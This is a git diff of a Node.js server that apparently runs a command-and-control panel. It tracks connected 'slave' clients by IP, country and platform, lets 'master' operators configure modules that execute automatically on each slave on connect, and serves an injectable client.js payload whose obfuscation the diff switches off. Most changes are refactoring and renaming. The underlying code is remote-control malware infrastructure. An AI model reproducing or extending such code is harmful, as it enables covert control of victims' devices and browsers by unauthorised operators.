@@ -27,7 +27,7 @@ let localIps = ["::1"];
 
 let slaveSockets = [];
 
-const defaultModulesSettings = {
+const defaultModuleSettings = {
 	onConnectModules: []
 };
 
@@ -68,7 +68,7 @@ const defaultServerSettings = {
 	}
 };
 
-let modulesSettings = { ...defaultModulesSettings };
+let moduleSettings = { ...defaultModuleSettings };
 let serverSettings = { ...defaultServerSettings };
 
 // Get ips of the server
@@ -85,11 +85,11 @@ Object.values(os.networkInterfaces()).forEach((iface) => {
 
 let mod = {
 	onModuleConfigChange(module, config, def) {
-		(!def ? modulesSettings : defaultModulesSettings)[module.name] = config;
+		(!def ? moduleSettings : defaultModuleSettings)[module.name] = config;
 		if (!def) saveSettings();
 	},
 	getModuleSettings() {
-		return modulesSettings;
+		return moduleSettings;
 	}
 };
 Modules.importModules(mod);
@@ -100,8 +100,8 @@ app.use("/", express.static(control_panel_path));
 app.get("/client/client.js", (req, res) => {
 	let payload = `window.nodeJsIp='${serverSettings.host}:${serverSettings.externalPort}';` + clientSrc;
 
-	res.send(obfuscator.obfuscate(payload, serverSettings.obfuscatorOptions).getObfuscatedCode());
-	//res.send(payload);
+	//res.send(obfuscator.obfuscate(payload, serverSettings.obfuscatorOptions).getObfuscatedCode());
+	res.send(payload);
 });
 app.use("/client", express.static(client_path));
 
@@ -136,13 +136,15 @@ slaves.on("connect", (socket) => {
 			socket.platform = platform;
 
 			masters.emit("slaveUpdate");
-		});
-	})
 
-	modulesSettings.onConnectModules.forEach((name) => {
-		let module = Modules.getModule(name);
-		if (module && module.platform === socket.platform) module.exec(socket);
-	});
+			moduleSettings.onConnectModules.forEach((name) => {
+				console.log(name)
+				let module = Modules.getModule(name);
+				if (module) module.exec(socket);
+			});
+		});
+		console.log(platform)
+	})
 
 	socket.on("disconnect", () => {
 		if (slaveSockets.indexOf(socket) != -1) {
@@ -157,36 +159,36 @@ slaves.on("connect", (socket) => {
 });
 
 masters.on("connect", (socket) => {
+	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);
+
+	if (localIps.includes(socket.ip)) socket.ip = "localhost";
+
 	socket.on("fetchSlaves", () => {
 
-		let data = [];
-
-		for (let i = 0; i < slaveSockets.length; i++) {
-			let socket = slaveSockets[i];
-
-			data.push({
+		let data = slaveSockets.map((socket) => {
+			return {
 				ip: socket.ip,
 				country: socket.country,
 				platform: socket.platform
-			});
-		}
-
-		data.push({
-			ip: "1.1.1.1",
-			country: "Russia",
-			platform: "Atari"
-		});
+			};
+		})
 
 		socket.emit("fetchSlavesResponse", data);
 	});
 
-	socket.on("getModuleSettings", () => {
-		socket.emit("getModuleSettings", modulesSettings);
+	socket.on("fetchModules", () => {
+
+		let modules = Modules.getAllModules().map((module) => {
+			return module;
+		})
+
+		socket.emit("fetchModulesResponse", {modules, settings: moduleSettings});
 	});
 
 	socket.on("updateModuleSettings", (data) => {
-		modulesSettings = data;
+		moduleSettings = Object.assign(moduleSettings, data);
 		saveSettings();
+		socket.emit("updateModules");
 	});
 
 	socket.on("shutdown", () => {
@@ -210,11 +212,11 @@ function onShutdown(exitCode, signal) {
 
 function saveSettings(callback) {
 
-	modulesSettings = Object.assign(defaultModulesSettings, modulesSettings);
+	moduleSettings = Object.assign(defaultModuleSettings, moduleSettings);
 	serverSettings = Object.assign(defaultServerSettings, serverSettings);
 
-	let modulesSettingsJson = JSON.stringify(modulesSettings, null, "\t");
-	fs.writeFile("modulesSettings.json", modulesSettingsJson, () => {
+	let modulesSettingsJson = JSON.stringify(moduleSettings, null, "\t");
+	fs.writeFile("moduleSettings.json", modulesSettingsJson, () => {
 
 		let serverSettingsJson = JSON.stringify(serverSettings, null, "\t");
 		fs.writeFileSync("serverSettings.json", serverSettingsJson);
@@ -225,15 +227,19 @@ function saveSettings(callback) {
 }
 
 function loadSettings(callback) {
-	if (fs.existsSync("modulesSettings.json")) {
-		let data = fs.readFileSync("modulesSettings.json");
+	try {
+		if (fs.existsSync("moduleSettings.json")) {
+			let data = fs.readFileSync("moduleSettings.json");
 
-		modulesSettings = JSON.parse(data);
-	}
-	if (fs.existsSync("serverSettings.json")) {
-		let data = fs.readFileSync("serverSettings.json");
+			moduleSettings = JSON.parse(data);
+		}
+		if (fs.existsSync("serverSettings.json")) {
+			let data = fs.readFileSync("serverSettings.json");
 
-		serverSettings = JSON.parse(data);
+			serverSettings = JSON.parse(data);
+		}
+	} catch (e) {
+		console.error("Invalid JSON:", e);
 	}
 	saveSettings();
 
